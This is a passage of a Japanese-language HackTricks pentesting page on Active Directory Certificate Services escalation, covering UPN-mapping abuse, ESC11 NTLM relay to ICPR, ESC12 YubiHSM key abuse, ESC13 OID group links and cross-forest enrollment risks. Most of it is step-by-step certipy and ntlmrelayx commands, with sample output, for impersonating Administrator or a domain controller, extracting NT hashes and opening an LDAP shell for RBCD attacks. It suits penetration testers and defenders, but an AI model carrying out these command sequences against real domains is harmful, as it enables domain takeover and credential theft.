certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
これに続いて、デフォルトの `User` テンプレートを使用して、`Jane` としてクライアント認証を有効にする証明書が要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`の`userPrincipalName`は元の`Jane@corp.local`に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
取得した証明書を使用して認証すると、`Administrator@corp.local`のNTハッシュが得られます。これは、証明書にドメインの詳細が含まれていないため、コマンドでドメインを指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` に `UPN` ビットフラグ (`0x4`) が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B を侵害することができます。これには、マシンアカウントや組み込みのドメイン管理者 `Administrator` も含まれます。

ここでの目標は、`Jane` のハッシュを Shadow Credentials を通じて取得し、`GenericWrite` を利用して `DC$@corp.local` を侵害することです。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`の`userPrincipalName`は`DC$@corp.local`に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
クライアント認証のための証明書がデフォルトの `User` テンプレートを使用して `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`の`userPrincipalName`は、このプロセスの後に元に戻ります。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannelを介して認証するために、Certipyの`-ldap-shell`オプションが利用され、認証成功は`u:CORP\DC$`として示されます。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAPシェルを通じて、`set_rbcd`のようなコマンドはリソースベースの制約付き委任（RBCD）攻撃を可能にし、ドメインコントローラーを危険にさらす可能性があります。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この脆弱性は、`userPrincipalName`が欠如しているか、`sAMAccountName`と一致しない任意のユーザーアカウントにも及びます。デフォルトの`Administrator@corp.local`は、昇格されたLDAP権限とデフォルトで`userPrincipalName`が存在しないため、主要なターゲットとなります。

## NTLMをICPRに中継する - ESC11

### 説明

CAサーバーが`IF_ENFORCEENCRYPTICERTREQUEST`で構成されていない場合、RPCサービスを介して署名なしでNTLM中継攻撃を行うことができます。[こちらを参照](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。

`certipy`を使用して、`リクエストの暗号化を強制`が無効になっているかどうかを列挙できます。certipyは`ESC11`の脆弱性を表示します。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 悪用シナリオ

リレーサーバーを設定する必要があります：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意: ドメインコントローラーの場合、DomainControllerで`-template`を指定する必要があります。

または、[sploutchyのimpacketのフォーク](https://github.com/sploutchy/impacket)を使用します:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### 説明

管理者は、証明書機関を「Yubico YubiHSM2」のような外部デバイスに保存するように設定できます。

USBデバイスがCAサーバーにUSBポート経由で接続されている場合、またはCAサーバーが仮想マシンの場合はUSBデバイスサーバーが接続されている場合、YubiHSM内でキーを生成および利用するために、認証キー（時には「パスワード」と呼ばれる）が必要です。

このキー/パスワードは、レジストリの`HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`に平文で保存されます。

[こちら](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)を参照してください。

### 悪用シナリオ

CAのプライベートキーが物理USBデバイスに保存されている場合、シェルアクセスを取得すると、そのキーを復元することが可能です。

まず、CA証明書を取得する必要があります（これは公開されています）そして：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最終的に、certutil `-sign` コマンドを使用して、CA証明書とその秘密鍵を使用して新しい任意の証明書を偽造します。

## OIDグループリンクの悪用 - ESC13

### 説明

`msPKI-Certificate-Policy` 属性は、発行ポリシーを証明書テンプレートに追加することを許可します。ポリシーを発行する責任のある `msPKI-Enterprise-Oid` オブジェクトは、PKI OIDコンテナの構成命名コンテキスト (CN=OID,CN=Public Key Services,CN=Services) で発見できます。このオブジェクトの `msDS-OIDToGroupLink` 属性を使用して、ポリシーをADグループにリンクすることができ、システムは証明書を提示するユーザーをグループのメンバーであるかのように認可できます。[こちらを参照](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。

言い換えれば、ユーザーが証明書を登録する権限を持ち、証明書がOIDグループにリンクされている場合、ユーザーはこのグループの特権を継承できます。

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用してOIDToGroupLinkを見つけます:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 悪用シナリオ

ユーザーの権限を見つけるには、`certipy find` または `Certify.exe find /showAllPermissions` を使用します。

もし `John` が `VulnerableTemplate` を登録する権限を持っている場合、そのユーザーは `VulnerableGroup` グループの特権を継承することができます。

必要なことは、テンプレートを指定するだけで、OIDToGroupLink 権利を持つ証明書を取得します。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## フォレストの妥協と証明書の説明（受動態）

### 妥協されたCAによるフォレスト信頼の破壊

**クロスフォレスト登録**の設定は比較的簡単です。リソースフォレストの**ルートCA証明書**は管理者によって**アカウントフォレストに公開され**、リソースフォレストの**エンタープライズCA**証明書は**各アカウントフォレストの`NTAuthCertificates`およびAIAコンテナに追加されます**。この配置は、リソースフォレストの**CAがPKIを管理するすべての他のフォレストに対して完全な制御を持つ**ことを明確にします。このCAが**攻撃者によって妥協された場合**、リソースフォレストとアカウントフォレストのすべてのユーザーの証明書が**偽造される可能性があり**、それによってフォレストのセキュリティ境界が破られることになります。

### 外部プリンシパルに付与される登録権限

マルチフォレスト環境では、**認証されたユーザーまたは外部プリンシパル**（エンタープライズCAが属するフォレスト外のユーザー/グループ）に**登録および編集権限を許可する証明書テンプレートを公開するエンタープライズCA**に関して注意が必要です。\
信頼を越えた認証の際、**認証されたユーザーSID**がADによってユーザーのトークンに追加されます。したがって、ドメインが**認証されたユーザーの登録権限を許可するテンプレートを持つエンタープライズCA**を持っている場合、**異なるフォレストのユーザーによってテンプレートが登録される可能性があります**。同様に、**テンプレートによって外部プリンシパルに明示的に登録権限が付与されると**、**クロスフォレストアクセス制御関係が作成され**、あるフォレストのプリンシパルが**別のフォレストのテンプレートに登録できるようになります**。

両方のシナリオは、あるフォレストから別のフォレストへの**攻撃面の増加**につながります。証明書テンプレートの設定は、攻撃者によって悪用され、外部ドメインでの追加権限を取得することができます。

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**

</details>
{% endhint %}
